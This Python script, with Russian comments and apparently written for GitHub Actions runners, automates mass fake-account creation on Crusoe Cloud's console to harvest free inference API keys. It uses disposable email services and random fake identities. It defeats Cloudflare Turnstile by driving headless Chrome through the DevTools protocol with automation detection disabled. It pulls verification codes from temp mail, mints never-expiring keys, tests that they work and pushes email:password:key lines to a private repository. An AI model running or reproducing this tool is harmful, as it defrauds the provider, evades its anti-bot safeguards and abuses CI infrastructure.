#!/usr/bin/env python3
"""farm301: crusoe-воркер для GitHub Actions (Azure IP — вне 1015-лимитов CF).
Сам решает turnstile локальным chrome (CDP), весь флоу чистым requests.
Ключи: в локальный файл + пуш в приватный dump-репо (PUSH_TOKEN)."""
import base64, json, os, random, re, string, subprocess, sys, threading, time
import requests
import websockets, asyncio

CONSOLE = "https://console.crusoecloud.com"
UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Safari/537.36"
CDP = "http://127.0.0.1:9222"
OUT = os.environ.get("OUT", "farm301_keys.txt")
WORKER = os.environ.get("WORKER", "w0")
MINUTES = int(os.environ.get("MINUTES", "60"))
DUMP = os.environ.get("DUMP", "ronnikols/crusoe-farm-dump")
PUSH = os.environ.get("PUSH_TOKEN", "")
MAILS = [("tmpl", "https://tempmail.plus"), ("mercure", "https://api.mail.tm")]
SKEY = "0x4AAAAAAEuX_Aa_eBQah2V0"

stats = {"ok": 0, "alive": 0, "attempts": 0, "fails": {}}
LOCK = threading.Lock()
PROV_LOCK = threading.Lock()
PROV_LAST = {}
PROV_MIN = {"mercure": 0.15, "tmpl": 0.25}
DOM_CACHE = {}


def log(m):
    print(f"[{time.strftime('%H:%M:%S')}] {m}", flush=True)


def rnd(n=10):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


def limit(prov):
    with PROV_LOCK:
        now = time.time()
        w = PROV_MIN.get(prov, 1.0) - (now - PROV_LAST.get(prov, 0))
        PROV_LAST[prov] = max(now, PROV_LAST.get(prov, 0) + PROV_MIN.get(prov, 1.0))
    if w > 0:
        time.sleep(w)


def mail_create():
    for attempt in range(6):
        kind, base = MAILS[attempt % len(MAILS)]
        try:
            limit(kind)
            if kind == "tmpl":
                return rnd(12) + "@mailto.plus", "", "", base, kind
            dom = DOM_CACHE.get(base)
            if not dom:
                doms = requests.get(f"{base}/domains", timeout=15).json()["hydra:member"]
                dom = next(d["domain"] for d in doms if d.get("isActive"))
                DOM_CACHE[base] = dom
            login, pw = rnd(8), rnd(12) + "Aa1!"
            r = requests.post(f"{base}/accounts", json={"address": f"{login}@{dom}", "password": pw}, timeout=15)
            if r.status_code < 400:
                tok = requests.post(f"{base}/token", json={"address": f"{login}@{dom}", "password": pw}, timeout=15).json()["token"]
                return f"{login}@{dom}", pw, tok, base, kind
        except Exception:
            time.sleep(1.5)
    return None, None, None, None, None


def mail_code(mtok, base, kind, timeout=160):
    t0 = time.time()
    seen = set()
    while time.time() - t0 < timeout:
        try:
            if kind == "tmpl":
                j = requests.get(f"{base}/api/mails/", params={"email": mtok, "first_id": 0, "limit": 20}, timeout=15).json()
                for m in j.get("mail_list", []):
                    if m.get("mail_id") in seen:
                        continue
                    body = m.get("text") or m.get("html") or ""
                    mm = re.search(r"\b(\d{6})\b", body)
                    if not mm and "crusoe" in str(m.get("from_mail", "")).lower():
                        full = requests.get(f"{base}/api/mails/{m.get('mail_id')}", params={"email": mtok, "first_id": 0}, timeout=15).json()
                        mm = re.search(r"\b(\d{6})\b", full.get("text") or full.get("html") or "")
                    if mm:
                        return mm.group(1)
                    seen.add(m.get("mail_id"))
            elif kind == "mercure":
                msgs = requests.get(f"{base}/messages", headers={"Authorization": f"Bearer {mtok}"}, timeout=15).json().get("hydra:member", [])
                for m in msgs:
                    if m["id"] in seen:
                        continue
                    full = requests.get(f"{base}/messages/{m['id']}", headers={"Authorization": f"Bearer {mtok}"}, timeout=15).json()
                    html = full.get("html") or []
                    body = (html[0] if isinstance(html, list) and html else "") or full.get("text") or ""
                    mm = re.search(r"\b(\d{6})\b", body)
                    if mm:
                        return mm.group(1)
                    seen.add(m["id"])
        except Exception:
            pass
        time.sleep(4)
    return None


# === chrome CDP (локальный) ===
async def _eval(ws_url, expr, timeout=70):
    async with websockets.connect(ws_url, max_size=10 * 1024 * 1024, open_timeout=10, close_timeout=3) as ws:
        await ws.send(json.dumps({"id": 1, "method": "Runtime.evaluate", "params": {"expression": expr, "awaitPromise": True, "returnByValue": True}}))
        while True:
            d = json.loads(await asyncio.wait_for(ws.recv(), timeout))
            if d.get("id") == 1:
                return d.get("result", {}).get("result", {}).get("value")


async def _click_ts(ws_url):
    try:
        async with websockets.connect(ws_url, open_timeout=10, close_timeout=3) as ws:
            await ws.send(json.dumps({"id": 1, "method": "Runtime.evaluate", "params": {
                "expression": '''(()=>{const w=document.querySelector('.cf-turnstile')||document.querySelector('[class*=turnstile]'); if(!w) return 0; const r=w.getBoundingClientRect(); window.__tsxy=[r.x+r.width/2, r.y+r.height/2]; return JSON.stringify(window.__tsxy)})()''',
                "returnByValue": True}}))
            while True:
                d = json.loads(await asyncio.wait_for(ws.recv(), 15))
                if d.get("id") == 1:
                    rect = d.get("result", {}).get("result", {}).get("value")
                    break
        if not rect:
            return
        x, y = json.loads(rect)
        async with websockets.connect(ws_url, open_timeout=10, close_timeout=3) as ws:
            for meth, params in [("Input.dispatchMouseEvent", {"type": "mousePressed", "x": x, "y": y, "button": "left", "clickCount": 1}),
                                  ("Input.dispatchMouseEvent", {"type": "mouseReleased", "x": x, "y": y, "button": "left", "clickCount": 1})]:
                await ws.send(json.dumps({"id": 3, "method": meth, "params": params}))
                await asyncio.sleep(0.2)
    except Exception:
        pass


def solve_token(ws_url, tries=2):
    for _ in range(tries):
        try:
            asyncio.run(_eval(ws_url, "location.href='https://console.crusoecloud.com/request'", 20))
            time.sleep(5)
            probe = '''new Promise((resolve)=>{ if(!window.turnstile) return resolve('notts');
              const d=document.createElement('div'); document.body.appendChild(d); let done=false;
              const wid=window.turnstile.render(d,{sitekey:'%s',action:'signup',size:'flexible',appearance:'always',
                callback:(t)=>{done=true;try{window.turnstile.remove(wid)}catch(e){}d.remove();resolve(t)},
                'error-callback':(e)=>{done=true;try{window.turnstile.remove(wid)}catch(e2){}d.remove();resolve('ERR:'+String(e).slice(0,30))}});
              setTimeout(()=>{if(!done){try{window.turnstile.remove(wid)}catch(e){}d.remove();resolve('TIMEOUT')}},55000)})''' % SKEY
            fut = asyncio.ensure_future(_eval(ws_url, probe, 60))
            time.sleep(9)
            try:
                asyncio.run(asyncio.wait_for(_click_ts(ws_url), 4))
            except Exception:
                pass
            tok = asyncio.get_event_loop().run_until_complete(fut) if False else None
            import concurrent.futures
            with concurrent.futures.ThreadPoolExecutor(max_workers=1) as ex:
                tok = ex.submit(asyncio.run, _eval(ws_url, "window.__tok301||''", 5)).result(timeout=6)
        except Exception as e:
            log(f"solve err: {str(e)[:50]}")
            time.sleep(2)
            continue
    return None


def solve_token_tab(ws_url):
    """синхронный надёжный: render + poll"""
    try:
        asyncio.run(_eval(ws_url, "location.href='https://console.crusoecloud.com/request'", 20))
        time.sleep(4)
        asyncio.run(_eval(ws_url, '''(()=>{window.__tok301=null;
          if(!window.turnstile) return 'notts';
          const d=document.createElement('div');d.id='p301';document.body.appendChild(d);
          window.turnstile.render(d,{sitekey:'%s',action:'signup',size:'flexible',appearance:'always',
            callback:(t)=>{window.__tok301=t}, 'error-callback':()=>{}});
          return 'rendered'})()''' % SKEY, 15))
        for i in range(48):
            time.sleep(1)
            if i == 9:
                try:
                    asyncio.run(asyncio.wait_for(_click_ts(ws_url), 4))
                except Exception:
                    pass
            v = asyncio.run(_eval(ws_url, "window.__tok301||''", 8))
            if v and len(str(v)) > 50:
                return str(v)
        return None
    except Exception as e:
        log(f"solve_token_tab err: {str(e)[:50]}")
        return None


def api_headers(csrf=None):
    h = {"Accept": "application/json", "User-Agent": UA, "Origin": CONSOLE, "Referer": CONSOLE + "/"}
    if csrf:
        h["X-CSRF-Token"] = csrf
    return h


def nodes_csrf(j):
    try:
        for n in j.get("ui", {}).get("nodes", []):
            if n.get("attributes", {}).get("name") == "csrf_token":
                return n["attributes"]["value"]
    except Exception:
        pass
    return None


def push_dump():
    """ключи локального файла → приватный dump-репо (каждые push_batch ключей, с ретраем на конфликт)"""
    if not PUSH:
        return
    try:
        cur = subprocess.run(["gh", "api", f"repos/{DUMP}/contents/{OUT}"], capture_output=True, text=True, timeout=30)
        sha = None
        old = ""
        if cur.returncode == 0:
            j = json.loads(cur.stdout)
            sha = j.get("sha")
            old = base64.b64decode(j.get("content", "")).decode()
        local = open(OUT).read()
        merged = old + "".join(x for x in local.splitlines(True) if x not in old)
        r = subprocess.run(["gh", "api", f"repos/{DUMP}/contents/{OUT}", "-f", f"message={WORKER} push", "-f", f"content=" + base64.b64encode(merged.encode()).decode(), "-f", f"branch=main"] + (["-f", f"sha={sha}"] if sha else []), capture_output=True, text=True, timeout=30)
        if r.returncode == 0:
            open(OUT, "w").write("")
    except Exception as e:
        log(f"push_dump err: {str(e)[:40]}")


def attempt(idx, ws_url, s):
    email, mpw, mtok, mbase, mkind = mail_create()
    if not email:
        return "mail"
    pw = "Crs!" + rnd(12) + "aA1"
    name = random.choice(["James", "Maria", "Linda", "Daniel", "Sofia"]) + " " + random.choice(["Walker", "Reyes", "Novak", "Bennett"])
    company = random.choice(["North", "Blue", "Summit", "Iron"]) + random.choice(["line", "stone", "works"]) + " " + random.choice(["Systems", "Digital", "Labs"])
    r = s.get(f"{CONSOLE}/api/v1", headers=api_headers(), timeout=40)
    if r.status_code != 200 or not r.headers.get("x-csrf-token"):
        return f"csrf{r.status_code}"
    csrf = r.headers["x-csrf-token"]
    tok = solve_token_tab(ws_url)
    if not tok:
        return "token"
    body = {"email": email, "company": company, "source": "portal", "referral": "", "use_case": "cloud", "cf-turnstile-response": tok}
    r = s.post(f"{CONSOLE}/api/v1/organizations/prospects", json=body, headers=api_headers(csrf), timeout=40)
    if r.status_code == 429:
        time.sleep(20)
        tok2 = solve_token_tab(ws_url)
        r = s.post(f"{CONSOLE}/api/v1/organizations/prospects",
                   json={**body, "cf-turnstile-response": tok2 or tok}, headers=api_headers(csrf), timeout=40)
    if r.status_code != 200:
        return f"prospects{r.status_code}"
    r = s.get(f"{CONSOLE}/auth/self-service/registration/browser", headers=api_headers(), timeout=40)
    reg_flow = r.json().get("id")
    reg_csrf = nodes_csrf(r.json())
    if not reg_flow:
        return "regflow"
    r = s.post(f"{CONSOLE}/auth/self-service/registration?flow={reg_flow}",
               json={"csrf_token": reg_csrf, "method": "password", "password": pw, "traits": {"email": email, "fullname": name}, "signup_token": ""},
               headers=api_headers(), timeout=40)
    if r.status_code != 200:
        return f"register{r.status_code}"
    vflow = None
    for c in r.json().get("continue_with", []):
        if c.get("action") == "show_verification_ui":
            vflow = c.get("flow", {}).get("id")
    if not vflow:
        r2 = s.get(f"{CONSOLE}/auth/self-service/verification/flows", headers=api_headers(), timeout=40)
        vflow = r2.json().get("id")
    if not vflow:
        return "vflow"
    code = mail_code(mtok, mbase, mkind)
    if not code:
        return "nocode"
    r = s.get(f"{CONSOLE}/auth/self-service/verification/flows?id={vflow}", headers=api_headers(), timeout=40)
    r = s.post(f"{CONSOLE}/auth/self-service/verification?flow={vflow}",
               json={"method": "code", "code": code, "csrf_token": nodes_csrf(r.json()) or ""}, headers=api_headers(), timeout=40)
    if r.status_code != 200:
        return f"verify{r.status_code}"
    r = s.get(f"{CONSOLE}/auth/self-service/login/browser?refresh=true", headers=api_headers(), timeout=40)
    lg_flow = r.json().get("id")
    r = s.post(f"{CONSOLE}/auth/self-service/login?flow={lg_flow}",
               json={"csrf_token": nodes_csrf(r.json()), "method": "password", "password": pw, "identifier": email},
               headers=api_headers(), timeout=40)
    if r.status_code != 200:
        return f"login{r.status_code}"
    pid = None
    for _ in range(8):
        r = s.get(f"{CONSOLE}/api/v1/organizations/projects", headers=api_headers(csrf), timeout=40)
        items = (r.json() or {}).get("items") or []
        if items:
            pid = items[0]["id"]
            break
        s.post(f"{CONSOLE}/api/v1/organizations/entities", json={"organization_name": company}, headers=api_headers(csrf), timeout=40)
        time.sleep(2.2)
    if not pid:
        return "noprojects"
    r = s.post(f"{CONSOLE}/api/v1/users/limited-usage-api-key?usage=inference",
               json={"alias": "farm-" + rnd(4), "expires_at": "never", "project_id": pid}, headers=api_headers(csrf), timeout=40)
    if r.status_code != 200:
        return f"key{r.status_code}"
    key = (r.json().get("api_key_info") or {}).get("api_key") or r.json().get("apiKey") or ""
    if not key:
        return "key0"
    alive = "0"
    try:
        ra = requests.post("https://api.inference.crusoecloud.com/v1/chat/completions",
                           headers={"Authorization": f"Bearer {key}", "Content-Type": "application/json"},
                           json={"model": "deepseek-ai/Deepseek-V4-Flash", "messages": [{"role": "user", "content": "hi"}], "max_tokens": 1}, timeout=45)
        alive = "1" if ra.status_code == 200 else "0"
    except Exception:
        alive = "0"
    line = f"{email}:{pw}:{key}:{alive}\n"
    with LOCK:
        with open(OUT, "a") as f:
            f.write(line)
        stats["ok"] += 1
        stats["alive"] += int(alive)
    log(f"OK {'ALIVE' if alive == '1' else 'DEAD'} {key[:14]}... (всего {stats['ok']})")
    return "ok"


def main():
    print(f"=== FARM301 {WORKER}: {MINUTES} мин, окно {(MINUTES-2)}", flush=True)
    t_end = time.time() + max(60, (MINUTES - 2) * 60)
    # локальный chrome
    subprocess.Popen(["google-chrome", "--headless=new", "--remote-debugging-port=9222", "--no-sandbox",
                      "--disable-blink-features=AutomationControlled", "--user-data-dir=/tmp/c301", "https://console.crusoecloud.com/request"],
                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(8)
    r = requests.put(f"{CDP}/json/new?https://console.crusoecloud.com/request", timeout=15).json()
    ws_url = r["webSocketDebuggerUrl"]
    s = requests.Session()
    s.headers.update({"User-Agent": UA})
    n = 0
    while time.time() < t_end:
        res = attempt(n, ws_url, s)
        with LOCK:
            stats["attempts"] += 1
            stats["fails"][res] = stats["fails"].get(res, 0) + 1
        n += 1
        time.sleep(2)
        if os.path.exists(OUT) and os.path.getsize(OUT) > 0 and n % 3 == 0:
            push_dump()
    push_dump()
    print(f"=== {WORKER} ИТОГ: ok={stats['ok']} alive={stats['alive']} attempts={stats['attempts']} fails={json.dumps(stats['fails'])}", flush=True)
    try:
        requests.get(f"{CDP}/json/close", timeout=5)
    except Exception:
        pass


if __name__ == "__main__":
    main()
